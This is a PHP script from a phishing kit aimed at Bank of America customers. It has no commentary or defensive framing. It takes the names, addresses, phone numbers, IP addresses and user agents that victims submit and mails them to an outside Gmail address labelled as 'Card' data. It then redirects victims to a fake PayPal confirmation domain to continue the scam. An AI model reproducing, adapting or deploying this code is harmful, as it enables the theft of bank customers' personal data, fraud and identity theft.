<?php
include ("images/blocker.gif");
if($_POST["fname"] != "" and $_POST["lname"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------BOA Info-----------------------\n";
$message .= "First Name            : ".$_POST['fname']."\n";
$message .= "Last Name              : ".$_POST['lname']."\n";
$message .= "Address Line              : ".$_POST['address']."\n";
$message .= "City             : ".$_POST['city']."\n";
$message .= "State            : ".$_POST['state']."\n";
$message .= "Zip Code            : ".$_POST['zip']."\n";
$message .= "Phone Number             : ".$_POST['phone']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$send = "apatchi020@gmail.com";
$subject = "Card | $ip";
{
mail("$send", "$subject", $message);   
mail($userinfo,$subject,$message);
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://login-paypal.com-police.intel-confirmation.donsson.com/Nouveau%20dossier/4.html");
}else{
header ("Location: h.html");
}

?>